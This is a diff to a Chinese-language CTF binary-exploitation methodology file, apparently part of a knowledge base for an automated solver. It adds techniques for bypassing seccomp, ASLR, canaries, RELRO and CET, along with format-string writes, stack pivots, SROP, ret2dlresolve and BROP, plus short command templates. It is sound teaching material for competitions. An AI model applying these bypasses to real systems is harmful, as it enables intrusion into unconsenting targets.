@@ -28,8 +28,32 @@ ldd <binary>                         # 本地 glibc 版本
 seccomp-tools dump ./<binary>        # 看是否 ORW 沙箱（禁了哪些 syscall）
 ```
 如果禁了 `execve` → 需要用 ORW（open→read→write）链读 flag，不能用 system("/bin/sh")。
+seccomp-tools 跑不了（macOS 主机无法执行 Linux ELF、容器内 gem 安装失败）→ filter 是运行时栈上构造时，用 `$SHARED_DIR/scripts/seccomp_bpf_decode.py` 从 idat 反汇编输出直接解码（用法见脚本 `--help`）; filter 是 .rodata 静态表时，用 idat `read_data` 按 8 字节步进读出后按 sock_filter{code u16, jt u8, jf u8, k u32} 手工解码。
 
-**ORW 链速查**（pwntools 模板）：
+**seccomp 系统性评估**:
+```bash
+grep Seccomp /proc/self/status    # 0=未启用 1=strict(仅read/write/exit/sigreturn,几乎无法绕) 2=filter
+grep NoNewPrivs /proc/self/status # 1=已设置(execve 提权也被禁)
+```
+dump 后三层分析: 白名单(默认 KILL)→找允许项的替代; 黑名单(默认 ALLOW)→更易绕; 架构检查仅 ARCH_X86_64 → x32 ABI 可绕。
+**替代 syscall 表**: open→openat / open→**openat2**（437，Linux 5.6+，常被 filter 漏掉; struct open_how{flags;mode;resolve} 24B 作第 4 参）/ read+write→sendfile / execve→execveat / mmap→mmap2 / dup2→dup3 / stat→newfstatat。
+**x32 ABI 绕过**: syscall 号 `| 0x40000000`（execve 59→0x4000003b）; RETF 切模式 cs=0x23(32-bit 兼容,号表不同)/0x33(64-bit)。
+**fd 继承**: filter 在 open 之后安装 → 已有 fd 仍可用（查 /proc/self/fd/）。允许 ioctl/ptrace → 内核攻击面大。
+容器: Docker 默认阻 ~44 个危险 syscall（mount/unshare/bpf/userfaultfd 等）; `--privileged`=全禁; K8s 不保证默认启用。
+
+**深度绕过四路**:
+- **类型宽度不匹配**（id 来自 games-and-vms-3）: seccomp BPF 对 64 位原始参数比较，内核 handler 可能 cast 到 32 位——`close(0x8000000000000002)` 过 "fd!=2" 检查但截断后关掉 fd 2，下一个 open 拿回 fd 2 走原本被封的 write; 对任何被滤 syscall 先查参数实际宽度
+- **int 0x80 架构混淆**（filter 无 arch 检查时）: 64 位进程 `int 0x80` 发 32 位语义 syscall，号不同（execve 32 位=11, mmap=90, open=5, read=3, write=4, mprotect=125）→ 只匹配 64 位号表的 filter 放行。约束: 指针参数须低 4GB（MAP_32BIT）。有 `if arch != X86_64 → KILL` 则此路不通转 x32 ABI。
+- **io_uring 绕过**（kernel 5.1-5.11）: seccomp 是 per-thread，io_uring 操作由 kworker 执行不继承 filter——提交 IORING_OP_OPENAT/READ/WRITE 在内核上下文跑。≥5.12 已修。
+- **ptrace 注入**（ptrace 放行+能 fork）: 子进程 SIGSTOP → 父 attach → PTRACE_POKETEXT 写 syscall 指令 + SETREGS 设 rax/rdi/rsi/rdx/rip → 子进程执行任意 syscall。RET_TRACE 类 filter 配 ptrace 可改写 nr/args。
+- **白名单组合升级**: splice+tee（fd 间搬数据）/ process_vm_readv（读他进程内存）/ prctl(PR_SET_NAME)（16B 内核可见通道）/ mmap+mprotect（RWX shellcode）/ memfd_create+execveat。RET_KILL=违规即死只能避开; **RET_ERRNO=进程存活可逐个探测放行状态**再系统性试替代号。sendfile ORW: read/write 全禁时 `open→sendfile(1,fd,0,len)`（SYS=40, len 在 r10）。
+- **条件缓冲地址限制**: filter 对参数**地址**做 SCMP_CMP_LE/GE 检查（read 只准高窗、write 只准低窗、两窗不重叠）——shellcode 读进 read 允许窗后 `rep movsb` 搬到 write 允许窗再输出。
+- **规则反汇编还原**: 静态/剥离符号时从 `seccomp_rule_add(ctx,action,nr,argc,arg_cmp*)` 手工还原——scmp_arg_cmp: +0x00 arg(uint)/+0x04 op(NE=1,LT=2,LE=3,EQ=4,GE=5,GT=6,MASKED_EQ=7)/+0x08 datum_a/+0x10 datum_b; default 0x7fff0000=ALLOW。产出参数条件表（含地址窗口边界）找黑名单缺口。
+- **X 寄存器寻址盲区**: BPF `code=0x1d`（JEQ X）= "syscall 号==rdx" 比较——seccomp-tools 反汇编不了（显示 ???），filter 实际比看起来松: ROP 设 rdx=rax=59 即放行 execve。手工解析 sock_filter{code,jt,jf,k} 8 字节结构搜 0x1d; 工具 dump 结果须实际验证。
+- **filter 当数据 oracle 的用户态重实现**: 程序把秘密逐位经 syscall 参数喂给 seccomp filter、以放行/EPERM 分支当比较结果时（常藏于 self-modifying verifier），无需内核配合——从二进制静态提取 cBPF 指令序列（30 条级），在 Python 里重实现 selector 位比较逻辑直接算出期望输入位串; filter 在当前内核 load 失败（EINVAL）也不影响静态提取。
+- **read 全禁时 mmap 文件映射**: open 被禁→openat(257); read 被禁→`mmap(NULL,0x1000,PROT_READ,MAP_PRIVATE,fd,0)` 把 flag 文件直接映射进内存再 write 输出——免 read syscall。其他替代: pread64(17)/readv(19)/writev(20)。
+
+**ORW 链速查**（pwntools 是写漏洞利用脚本用的 python 库——`from pwn import *` 导入后 remote/process/asm/shellcraft 等函数全可用，以下模板均在此前提下）：
 ```python
 # shellcode 版（有执行权限时）
 sc  = shellcraft.pushstr('/flag')
@@ -65,6 +89,19 @@ libc_base = leak - (libc.symbols['main_arena'] + 96)  # 按实际版本调
 heap_key = leaked_fd >> 12  # = fd 字段所在堆页的页号，必须先泄漏堆地址
 ```
 
+**libc 版本识别（远程 libc 未知时）**:
+- 原理: ASLR 只随机化高位，**低 12 位页内偏移恒定** → 只需低 12 位即可匹配版本
+- 在线: libc.blukat.me / libc.rip 输入函数名+低 12 位
+- 本地 libc-database: `./get ubuntu` → `./find puts 0x5a0 printf 0xe10`（**多函数交叉确认**）→ `./download <id>`
+- 验证: `libc.address = leak - libc.sym['puts']` 后**必须以 000 结尾**（页对齐），否则泄漏解析有误
+- LD_PRELOAD 换 libc 在 setuid 二进制不生效，优先 `$(dirname $PYTHON_CMD)/patchelf`
+
+**DynELF 运行时符号解析（完全无 libc 线索时）**: 有可重复任意读原语（格式串 %s / puts(addr)+重入）时给 `DynELF(leak, elf=elf)` 提供 leak(addr) 回调，自动解析远程 .dynamic/link_map/符号表得 `d.lookup('system','libc')`——无需知道 libc 版本。低 12 位+libc-database 更快（需部分线索），DynELF 适合零线索且泄漏交互便宜场景。
+
+**两阶段泄漏的返回目标**: stage1 泄漏后返回**main 里 `call vuln` 指令的地址**（而非 main 入口/vuln 入口）——call 指令建立干净栈帧，main 入口可能因 check_status/setup 破坏栈而崩。
+
+**尺寸字段篡改的渲染 stride 失配泄漏**: 越界写（含 OR-only 单比特写）改到结构体内 `width/height` 类尺寸字段使其大于真实存储维度 → 渲染/打印函数按被改的 stride 逐行读 → 输出里混入结构体后续的栈/堆数据（返回地址、相邻指针），从前几行输出即可恢复 PIE/libc/栈基址。前提: 渲染 stride 动态取自被改字段、真实存储按原 stride 布局。审计: 找"结构体尺寸字段 + 按尺寸字段循环输出的渲染器"组合，负索引/单比特写能触达即成泄漏。
+
 ### 步骤 6：落点选择
 按 glibc 版本查 §3 决策树，选择劫持目标（hook/IO_FILE/exit_funcs/_rtld_global/TLS）。
 详细伪造模板见 `pwn-heap-methodology.md`。
@@ -73,7 +110,7 @@ heap_key = leaked_fd >> 12  # = fd 字段所在堆页的页号，必须先泄漏
 ```bash
 one_gadget <libc.so>                 # 找 one_gadget（约束条件需满足）
 ```
-- one_gadget 约束不满足 → 换 `system("/bin/sh")` 或栈迁移 ROP
+- **约束满足技巧**: `[rsp+0x??]==NULL` 类用 `p64(0)` 填栈槽; 寄存器约束用 pop gadget 置 0; 全不满足 → 换 `system("/bin/sh")` 或栈迁移 ROP; `angry_gadget`（gem 包）提供更多候选; `one_gadget <libc> -l 2` 输出更多候选（约束更松）
 - ORW 沙箱 → `open("/flag") → read(fd, buf, 0x100) → write(1, buf, 0x100)`
 
 ### 步骤 8：调试迭代
@@ -85,6 +122,32 @@ patchelf --set-interpreter <ld_path> --set-rpath <libc_dir> <binary>
 # 本地打通后打远程
 ```
 
+### 题型变体：信息枚举类（无利用原语）
+
+**识别信号**（满足前两条即按本节流程，替代 §1 利用向流程）：① 程序所有输出走固定字符串（无 printf/格式化串，无泄读变量的常规通道）；② 秘密数据（flag/密钥）在启动阶段被读入、打散或搬运进深栈帧后函数返回——成为**栈残留**；③ 存在打印单个变量的输出原语（如手写 print_int）。
+
+**未初始化输出槽原语（审计点）**：手写 parse/转换函数的失败路径常见缺陷——"输入非法时直接 return，不写输出指针"。若调用序列是 `parse(buf, &slot)` 之后紧跟 `print(slot)`，则让 parse 失败（输入非数字）即打印 slot 的**进入函数时栈残留** = 4 字节栈读原语。审计方法：反汇编中 grep 所有"parse 调用后跟打印"的路径，检查失败分支是否写输出槽。注意：前序交互若输入过数字会污染槽，触发打印的那次交互之前保持槽未被写过。
+
+**栈深导航**：菜单驱动程序若所有出口都是 `call <菜单函数>`（函数永不返回、栈只增不减），则每条菜单回路产生固定栈深增量（环）。泄漏槽对准目标数据的条件：**Σ(环增量) == 目标数据相对基准的偏移**。环增量必须实测——gdb 断点打印每次进入菜单函数的 rbp，相邻两次差值即环增量；禁止手算推导（帧距公式 `callee_rbp = caller_rbp - caller_sub - 0x10`，ret+push rbp 共 0x10）。三条易错规则：① 公式用 **caller** 的 sub 不是 callee 的；② 会返回的临时调用（帧被回收）不计入环增量；③ 16 进制累计必须用工具（`python -c` 或 stack_frame_calc.py），多级手算错误率高。
+
+**可达性分析**：所有函数 sub rsp 为 16 倍数且无 prologue 之外的 push 时，环增量半群 ≡ 0 (mod 16)——部分目标偏移**结构性不可达**（无论怎么组合菜单都到不了）。秘密数据的连续副本（read 直读进未清零区的那份）可提供补充读取窗口，但窗口偏移受同样的模约束。判定必须穷举（AI 心算不可靠）：`stack_frame_calc.py --reach`，输出组合方案或"不可达 + 模相位证据"。
+
+**枚举收集**：每连接泄漏一个窗口——无 fork 的服务重连即新进程、栈布局不变，N 个窗口用 N 个连接收集。程序若有全局延迟开关（某输入值置 nanosleep 参数为 0）优先在连接首行关闭，否则每步交互拖 2 秒级延迟。
+
+**缺口处理**：拿到 N-4 字节、剩余缺口经 `--reach` 判定数学不可达时，转入验证 oracle 流程（`$SHARED_DIR/knowledge-base/verification-patterns.md` 第零步），**禁止直接交付语义猜测**。
+
+**stack_frame_calc.py 调用模板**：
+```bash
+# 模式 1: 提取帧表（函数名 → sub rsp 值），供链式计算引用
+$PYTHON_CMD "$SHARED_DIR/scripts/stack_frame_calc.py" --elf ./target
+# 模式 2: 调用链帧距（输出每层 rbp 相对初始 rbp 的偏移，消除手算）
+$PYTHON_CMD "$SHARED_DIR/scripts/stack_frame_calc.py" --elf ./target --chain main,menu_a,menu_b
+#   或直接给 sub 值序列: --subs 0x110,0x110,0x170 --chain f1,f2,f3
+# 模式 3: 环组合可达性（能否由环增量的非负组合凑出目标偏移）
+$PYTHON_CMD "$SHARED_DIR/scripts/stack_frame_calc.py" --reach --loops 0x120,0x400 --target 0x5A0
+#   --fixed-step 0x440: 额外允许某固定步进的任意倍数（如每层递归的帧深）
+```
+
 ## §2 mitigations 应对速查表
 
 | 缓解 | 影响 | 应对策略 |
@@ -92,19 +155,32 @@ patchelf --set-interpreter <ld_path> --set-rpath <libc_dir> <binary>
 | Full RELRO | GOT 不可写 | 转 IO_FILE / exit_funcs / _rtld_global / 栈 ROP |
 | Partial RELRO | GOT 可写 | ret2dlresolve / 改 GOT |
 | PIE | 代码地址随机 | 先泄漏代码基址（格式化字符串 / 任意读） |
-| Canary | 栈溢出被检测 | 泄漏 canary / 爆破（fork 进程）/ TLS 覆盖法 |
+| Canary | 栈溢出被检测 | 泄漏 canary / 爆破（fork 进程 256×7 次）/ TLS 覆盖法 / `__stack_chk_fail@GOT` 改无害函数（Partial RELRO）/ null byte 覆写泄漏 / 堆漏洞绕开（canary 只保护栈）|
 | NX/DEP | 不可执行 shellcode | ROP / ret2libc / ret2csu |
-| ASLR | 地址随机化 | 信息泄漏（unsorted bin / 格式化字符串）。注: Linux 5.18+ 弱化了 64-bit 可执行文件 ASLR；32-bit 且库 ≥2MB 时 ASLR 完全失效（影响爆破概率） |
+| ASLR | 地址随机化 | 信息泄漏（unsorted bin / 格式化字符串）。注: Linux 5.18+ 弱化了 64-bit 可执行文件 ASLR；32-bit 且库 ≥2MB 时 ASLR 完全失效（影响爆破概率）。熵量化: 栈 22bit/mmap·libc 28bit/brk 堆 13bit/PIE 28bit → 64 位爆破不可行必须泄漏; PIE partial overwrite 末 2 字节单次 1/16 |
 | seccomp(ORW) | 禁 execve | open→read→write 链；禁 open 则 openat / memfd_create |
 | FORTIFY | 限制危险函数 | 换等价函数绕过 |
 | **内核** SMEP | 内核不可执行用户页 | 内核 ROP / 栈迁移 / pt_regs 做内核 ROP |
 | **内核** SMAP | 内核不可读用户页 | copy_from/to_user / msg_msg 等内核内数据 |
 | **内核** KPTI | 隔离页表 | swapgs_restore 跳板返回用户态 |
 | **内核** KASLR | 内核地址随机 | 结构体函数指针泄漏（tty_struct 等） |
-| CET/Shadow Stack | 返回地址校验 | 改函数指针而非返回地址 / 合法栈帧 |
+| CET/Shadow Stack | 返回地址校验 | 改函数指针而非返回地址 / 合法栈帧。细化: Shadow Stack 只校验 ret——**JOP（jmp [reg]）不受检查**; IBT 要求间接跳转落 ENDBR64 → 用 ENDBR 开头 gadget 链; data-only（modprobe_path 等非控制流目标）是终极兜底 |
 | CFI(kCFI/RFP) | 间接调用类型校验 | 同签名合法目标 / 非函数指针落点 |
 | ARM PAC | 指针带签名 | 签名重用 / 已签指针直接用 |
-| ARM MTE | 内存染色标签 | 概率爆破 / tag 旁路 |
+| ARM MTE | 内存染色标签 | 概率爆破(1/16) / tag 旁路。深化: **in-bounds 利用优先**（同 tag 区域内相对偏移改字段，tag 永远匹配）/ tag oracle 时序侧信道 / LDGM-STGM 指令读写 tag / 推测执行窗口 |
+
+**checksec 不可用时手动检查**:
+```bash
+readelf -l <bin> | grep GNU_STACK   # RW=NX 启用, RWE=栈可执行
+readelf -h <bin> | grep Type        # DYN=PIE, EXEC=非 PIE
+readelf -l <bin> | grep GNU_RELRO && readelf -d <bin> | grep BIND_NOW
+# 有 RELRO 段+BIND_NOW=Full; 有段无 BIND_NOW=Partial(GOT 可写); 无段=No(.dynamic 也可写)
+cat /proc/sys/kernel/randomize_va_space   # 0=关 1=部分 2=完全
+```
+
+**保护组合效应**: ASLR+PIE=代码数据双随机需两次泄漏（或相对偏移一次推算）; Full RELRO+glibc≥2.34=GOT 与 hooks 双堵 → _IO_FILE/exit_funcs/TLS_dtor_list 仅剩; CET+Full RELRO=ROP 与 GOT 双堵 → data-only; FORTIFY+Canary=格式串受限+栈溢出受检 → 优先堆路径。
+**手上有 X 要 RCE 路由**: 格式串 only → 泄漏后覆写 GOT/hook; 栈溢出无泄漏 → ret2dlresolve/SROP（不需 libc 基址）; 任意写无泄漏 → partial overwrite .got.plt 低位重定向 win 函数; 任意写+libc 泄漏 → hook(<2.34)/FSOP(全版本)。
+单进程关 ASLR（不改系统）: `setarch $(uname -m) -R ./vuln`。
 
 ## §3 glibc 版本 → 落点决策树
 
@@ -142,37 +218,221 @@ patchelf --set-interpreter <ld_path> --set-rpath <libc_dir> <binary>
 | userfaultfd 被禁 | FUSE 阻塞 / MADV_DONTNEED+并发 mprotect / io_uring stall / fallocate |
 | 利用链崩在 CFI/PAC | 改用非函数指针落点：modprobe_path / Dirty PageTable / 任意文件写 |
 | 远程超时 | 用 `context.log_level='debug'` 检查交互时序；pwntools `p.recvuntil` 而非 `sleep` |
-| **栈迁移**（溢出空间小，ROP 链放不下） | 方法 A `leave;ret`：覆写 saved rbp = `chain_addr-8`、ret = `leave;ret` gadget → sp 迁到 chain。方法 B `xchg rsp,rax;ret`（rax 持堆/bss 指针）。方法 C `pop rsp;ret`。ARM64：找 `mov sp,x29` 控 x29 |
+| **栈迁移**（溢出空间小，ROP 链放不下） | 方法 A `leave;ret`：覆写 saved rbp = `chain_addr-8`、ret = `leave;ret` gadget → sp 迁到 chain。**双 pivot 变体**（溢出仅够 rbp+rip 时）: 先迁到 BSS 放 mini-ROP 调 `fgets(BSS+X, 0x700, stdin)` 装载完整链。方法 B `xchg rsp,rax;ret`（rax 持堆/bss 指针）⚠ **xchg rax,esp 在 64 位截断 rsp 高 32 位**——pivot 地址须在低 4GB（堆/mmap 常可，栈 0x7fff 不可）。方法 C `pop rsp;ret`。ARM64：找 `mov sp,x29` 控 x29 |
 | **off-by-null 栈迁移** | off-by-null 清 saved rbp 最低字节（15/16 概率 rbp 偏移到可控 buffer）→ `leave;ret`（等价 `mov rsp,rbp;pop rbp`）→ main 返回时 RSP 落入被 overflow 的 buffer。buffer 铺满 `ret` gadget（ret sled）提高命中概率，末尾放真实 ROP 链 |
+| **等尺寸递归帧单字节 rbp 枢轴** | 递归函数每层帧大小固定（如 0x70）→ 深度 d 的 saved rbp 低字节 = 根 rbp 低字节 - 0x70×d（mod 256），深度可控即单字节覆写可确定性指向某祖先帧内偏移。配合一次性 `mov sp,0; sub rsp,0x20000` 类强制对齐帧（帧指针槽相对输入缓冲区的偏移恒定，不受 ASLR 影响）后，目标帧 rbp 低字节差可直接算出。被覆写帧 `leave;ret` 时 RSP 迁入祖先层的小型可控缓冲（如 40B 描述区）内预铺的假帧（canary/fake rbp/gadget/参数/system）。适用于溢出仅够改 rbp 单字节的场景 |
 | **格式化字符串偏移定位** | x86-64：`%1`~`%5` 读 rsi/rdx/rcx/r8/r9，`%6` 起读栈。发 `AAAAAAAA %6$p` 数到 `0x4141414141414141`。一键构造：`fmtstr_payload(offset, {addr: val}, write_size='byte')`。ARM64：`%1`~`%8` 读 x0-x7，`%9` 起读栈 |
+| **格式串手动写入**（自动化不可用时） | %hn 分段: 拆 HOB/LOB 先写小值再写大值（差值做 `%Nc` padding）; 64 位地址含 \x00 必须放 payload 尾部; 多轮用 FmtStr 类 `fs.write()+execute_writes()`。⚠ `_FORTIFY_SOURCE=2`（见 `__printf_chk` 符号）**只拦 %N$ 位置参数与 %n 组合**——顺序 %n/%hn 链仍可用（计数需极精确）; 必须用 %N$n 时才换越界写/UAF 写原语 |
+| **格式串补充** | 写入宽度: %hhn(1B)/%hn(2B)/%n(4B)/**%ln(8B)**; 64 位地址 48 bit → 3×%hn 或 6×%hhn。GOT 目标补充: `atoi@GOT→system`（发 "sh" 当"数字"）。**盲格式串七步**: %p×50 dump → 按模式分类地址（0x7f/0x7ff/代码段）→ AAAA%N$p 定输入偏移 → 推基址 → %N$s 读 GOT → 算 libc → 覆写收尾（格式串自身是读原语，盲打远比 BROP 便宜）。**格式串不在栈上（堆缓冲）**: 找栈上已有指针链（saved RBP 链典型）——%A$hn 改 ptr 低位指向 target，再 %B$hn 经它写出（两段写，第一段只需改低 2 字节不需全栈泄漏）。**指针链定位法**: `%6$p|%20$p|%50$p` 类间隔探针 dump 栈——指针值彼此成 8/0x100 整数差的即同帧相邻槽; 配一个 OOB 单字节读原语读某参数指针的 byte1（`rbp+index-1` 类索引读），从指针值减去已观察的偏移差即可标定 saved RIP/关键槽的精确位置——无需完整栈 dump。**短格式串窗口（≤31B）**: %Nc 精确计数保写宽度（如 `%161c%50$hhn` 恰写 0xa1）; 16 字节栈对齐使目标低字节只有 0x08/0x18/.../0xf8 共 16 候选——逐连接枚举，单次 1/16 命中即 bootstrap 成功|
+| **GDB 与实际运行地址不一致** | qemu-gdb 注入 LINES/COLUMNS 环境变量改变栈布局 → `unset env LINES` `unset env COLUMNS` 后重测; 静态链接无符号定位输入点: 运行→等输入→Ctrl+C→`bt` 看 read 调用链。exploit 崩溃排查顺序: ①16 字节栈对齐(加 RET gadget, system 内 movaps) ②坏字符 \x00\x0a\x0d ③地址计算 qemu-gdb verify ④远程 libc 差异 |
+| **写入值宽度受限（如 7 字节十进制 atol）写不了高地址** | **GOT 重定向链拼装**: 值域写不了 libc/栈地址，但写得了二进制内低地址（No PIE）——把多个 GOT 项各重定向到二进制内小代码片段，用调用序列的**寄存器残留**拼出想要的调用（read 类）。例: `memset@GOT`→`mov rax,[stdout]; mov rdi,rax; call setbuf` 片段（rax=stdout 指针）、`setbuf@GOT`→`mov rsi,rax; mov edi,0; call read` 片段、调用方原有 `rdx=0x40` 残留 → 组合出 `read(0, *stdout, 0x40)` 即对 stdout 结构前 64B raw write; `__stack_chk_fail@GOT`→main 输入循环地址（canary 检查失败变成返回循环，重入即重写）。审计: 输入解析值域 + GOT 表相邻负索引 + 调用点前后片段的寄存器数据流 |
+| **写原语只能置位（OR，0→1）** | **OR-only 写的 ASLR 兼容筛选**: 目标值的期望位模式含 1→0 翻转需求时该布局不可用; 只需 0→1 的布局才可写。逐次连接检查目标地址（泄漏后比对期望值与当前值），位冲突→断开重连换 ASLR 布局重试（重试次数由期望值中 1→0 翻转约束数决定）。与 partial overwrite 概率枚举互补: 那是**写值受位宽限制**，这是**写操作本身受限**——先判原语方向再选策略 |
+| **单次触发不够（Eternal Loop）** | ① ROP 尾接 main 导回漏洞点 ② 覆写 exit@GOT → 漏洞函数（退出即重入）③ `.fini_array` 双函数: [漏洞函数, `__libc_csu_fini`]（后者重新调用 .fini_array → 永久循环; 需 **No RELRO**——Partial/Full 下 .fini_array 随 GNU_RELRO 段启动后只读，别信"Full RELRO 也能改 fini_array"的说法）。静态二进制无 GOT 可劫时 _fini_array 是天然 re-entrant 回调表，双条目+add rsp,N;ret 下探可分段拼接 ROP。④ **libc 启动路径单字节重入**: main 的正常返回地址是 `__libc_start_main` 内 `mov edi,eax; call exit` 前的 call-main 返回点（Debian glibc 2.41 为 base+0x29ca8），其前面紧邻 `mov rax,[rsp+8]; call rax` 重载序列（mov 在 0x29ca1、call 在 0x29ca6——重定向目标取**序列起始的 mov 指令地址**，不能只跳 call: 那时 rax 是 main 的返回值而非函数指针）。saved RIP 低字节改为 0xa1 即从 `[rsp+8]` 重载 main 指针并重新调用——低 12 位不受 ASLR 影响，无需泄漏; 单次改写只购得一次重入，但每次重入的 `call rax` 又把返回地址推回 0x29ca8（返回点自动复位到已知退出路径），再次改低字节 0xa1 即可再次重入——改写可反复进行。**流水线化写**: 每次 call 重推返回地址，任意写须拆两次调用——第一次恢复 0xa1 + 重定向栈上指针，第二次经重定向指针写目标并再恢复（配 `%hhn` 半字写消费短格式串窗口） |
+| **无 pop rdx / gadget 极少 / 静态二进制** | **SROP**: pop rax=15(rt_sigreturn)+syscall;ret 两 gadget 即可，SigreturnFrame 一次设全部寄存器+可迁 rsp（帧含 rsp 字段）|
+| **无泄漏途径且 No/Partial RELRO** | **ret2dlresolve**: 伪造 Elf_Rel/Sym/"system" 字符串让 _dl_runtime_resolve 解析——不需 libc 基址; pwntools `Ret2dlresolvePayload` 自动化; 64 位注意 VERSYM 合法与 24B 对齐 |
+| **需要 3 参数但无 pop rdx** | **ret2csu**: csu_pop(rbx,rbp,r12-r15)+csu_call（mov rdx,r13;rsi,r14;edi,r15d; call [r12+rbx*8]）——r12 须指向**函数指针地址**（GOT）、rbx=0/rbp=1 跳循环、edi 只 32 位、call 后 56B padding。PIE 未泄漏/静态无 csu 时转 SROP |
+| **拿不到二进制（盲打远程 fork 服务）** | **BROP**: ①逐字节爆破偏移+canary（子进程布局不变）②找 stop gadget（不 crash 的挂起地址）③探测 6-pop csu gadget（候选地址后接 6 个 A + stop，存活即命中）④PLT 16B 间隔迭代探测 puts/write ⑤puts 逐页 dump 二进制 ⑥转标准 ROP |
+| **CET 拦 ROP** | **JOP**: dispatcher `add rax,8; jmp [rax]` 表驱动串联——jmp 不走 shadow stack 校验（IBT 要求 ENDBR 落点）; COP 用 call [reg] 链（部分受 IBT 限制）。**ret 链不受 IBT 限制**（SHSTK 未被运行时强制时; shadow stack 真被强制仍拦改写返回地址，见本行 JOP/影子栈条）——返回地址可指向任意已存在指令; 终落点选 libc 内**满足当前寄存器/内存条件的合法函数或函数内部已知路径**（如寄存器恰好满足参数约定时直达 posix_spawn("/bin/sh") 类路径），不注入代码、复用现有栈帧与合法控制流。配合"返回点自动复位"（重定向目标自身把返回地址推回已知点）可多轮进入同栈逐位累积写完整地址。**用户态自实现影子栈**: 漏洞在实现自身——shadow_stack_ptr 递增无界检查，可控递归 N 次（N=(可控缓冲-数组)/8）让指针落相邻用户可写 .bss（username 类）→ 写 win 进去 → 硬件栈与影子栈同值校验通过。硬件 CET 全开无影响 |
+| **MIPS/ARM32 目标** | MIPS: 常无 NX 先试栈 shellcode; **branch delay slot 必执行**（链排布须计入）; jalr $t9+$a0-$a3; **cache 一致性**——写后执行前 sleep(1) 刷 I-cache 否则崩。ARM32: `pop {r0-r3, pc}` 一次控 4 参数; Thumb 混合模式 gadget 池翻倍（地址 LSB=1 切换; Thumb 指令更易避开 null）; NOP=0xe1a00000; dup2 循环 svc #1。**ARM64 无 pop x0**: 找返回值为常量指针的 libc 函数——`getusershell()` 返回 "/bin/sh" 落 x0（=首参寄存器）→ 两调用链 getusershell+system 免装载; getenv("SHELL")/tmpnam 同族; 适用返回寄存器==首参寄存器的全部 ABI（ARM/MIPS v0/RISC-V a0）。**m68k**: 号在 d0/参 d1-d3/`trap #0`（read=3,write=4,dup2=63,execve=11）; 14B 极限一段改 d3=256 跳回程序自身 read 重用 fd+RWX。**DOS COM 实模式**: 代码段可写、int 0x21（ah=3d open/3f read/09 打印 $ 串） |
+| **32-bit 旧内核（<3.18 嵌入式）** | **ret2vdso**: vDSO 内 sigreturn gadget（<2.6.18 固定 0xffffe000 / 2.6.18-3.17 仅 8bit 熵可爆破）→ SROP。**64 位版**: vDSO 虽完全随机，但栈上 auxv 的 **AT_SYSINFO_EHR(type 0x21)** 存 vDSO 基址——栈泄漏后 dump 栈搜 0x21+页对齐 0x7f 值定位，再 dump vDSO 本地找 gadget（vDSO 内核特定必须 dump 远程）→ 静态二进制零 gadget 场景主力 |
+| **PIE 未泄漏又需 ret 对齐** | **vsyscall 固定地址 ret**: 0xffffffffff600000/0x400/0x800 三条目各 +0x9 处 ret，不受 ASLR/PIE 影响，当 NOP-ret 滑到 partial overwrite。⚠ 现代内核 emulate/none（vsyscall=none 禁用）模式，用前 `cat /proc/self/maps \| grep vsyscall` 验证 |
+| **目标程序是 SUBLEQ OISC**（单指令集 VM） | 唯一指令 `*dst -= *src; if (*dst <= 0) goto addr` 可链式构造任意读/写（减法即写原语、自减清零+借位构造值）。函数指针经 **PTR_MANGLE** 混淆存储（ROL17(ptr^secret)，secret 在 TLS fs:[0x30]）: ①partial leak 泄 secret ②算 unmangled 目标 ③写 mangled 指针进 SUBLEQ 内存。secret 恢复另两路: TLS 直接泄漏/ `_dl_fini` 已知明文——见 pwn-heap 落点 B |
+| **shellcode 输入极小（~9B）+寄存器清零** | **syscall RCX 副作用**: syscall 把下条指令地址存 RCX——`syscall(nop); mov rsi,rcx; mov dl,0xff; syscall` 共 10B 拉入大二阶段（stager 模式: 一阶段只需已知地址+read 参数+syscall）。ORW flag 路径常见: flag / /flag / /flag.txt / **/proc/self/environ** |
+| **数据重解释类漏洞**| ① 模拟器宽寄存器寻址窄缓冲（I 寄存器 16 位 vs mem[4096]）→ 越界直达宿主栈 ret2libc（qemu-gdb 定标一次偏移）; ② **float qsort 排序即写入**——输入位模式合适的 double 让排序把 canary 归位+win 地址落 RIP 槽（无需写原语）; ③ `abs(INT_MIN)` UB 返回原值 → 负索引 `% size` 写 BSS 相邻结构（爆破 hash==0x80000000; 防御 `(unsigned)hash % size`）|
+| **qsort 非传递比较器越界（libc 内部攻击面）** | 程序对攻击者可控元素调 qsort 且比较器非传递（`return a-b` 溢出/无符号相减/含 rand()/NULL 特判即中招）→ 用低 `RLIMIT_AS` 逼 qsort 内部临时缓冲 malloc 失败（`prlimit --as=<N> ./prog`，SUID 同样生效; 远端用内存泄漏耗尽）→ 回退 in-place 排序 → 插入阶段 `tmp_ptr` 递减**越过数组下界**读写前方内存: 堆上数组前是 chunk 头（mchunk_size 高字被写 INT_MIN=0x80000000）、栈上数组前是 canary/局部变量（被清 0）——无写原语直接得到 OOB 读写。版本: glibc ≤2.38 走 quicksort 回退路径; 2.39 曾改 introsort 并加边界检查后又回退为 mergesort+**heapsort** 回退（heapsort 路径的健壮性未证实，2.39+ 打之前先本地验证）。检查: grep 比较器函数是否含减法/rand/早退特判 |
 | **无泄漏途径（socket fd 操纵法）** | 线程服务器 + BOF 能改 fd：① BOF 替换 fd → close 原 fd ② 给另一个等待 `read` 的 socket 发 RST 包 → `read` 返回 -1 ③ 未初始化栈缓冲通过被替换的 fd 泄漏到另一个 socket |
 | **core_pattern 攻击面** | 脆弱程序注册在 `/proc/sys/kernel/core_pattern` → 构造畸形 ELF 触发崩溃 → core dump 处理器解析 ELF symtab/strtab 时 OOB 读 flag |
 | **tcache 被禁用** | fastbin double free + 利用 `malloc_consolidate`（top 不可用但 fastbin 存在时自动触发，合并 fastbin 到 unsorted bin 构造堆布局）。⚠2.43 补 fastbin_dup 后需换路 |
+| **gadget 池枯竭**（小二进制） | `cmp`/`mov`/`test` **大立即数的操作数字节**可解码为 gadget: `cmpl $0xc35e415f,-0x4(%rbp)` 编码 `81 7d fc 5f 41 5e c3`，+3 起 = `pop rdi;pop r14;ret`。pwntools `ROP(elf)` 自动扫非对齐入口。**字符串后缀素材**: 既有 rodata 字符串的子串可当参数指针——`"Wish\0"` 内偏移 2 处即 `"sh\0"`（W=0/i=1/s=2/h=3），`system(str+2)` 免注入命令串; 找法: `strings -t x` 后按目标子串（sh/cat/ls）搜偏移。**非 No-PIE 小静态/动态混合二进制**: 主程序 gadget 不足时优先扫指令立即数字节，其次 PLT 段尾（`plt+0x10` 对齐处常有多余 ret），最后才考虑栈内解码 |
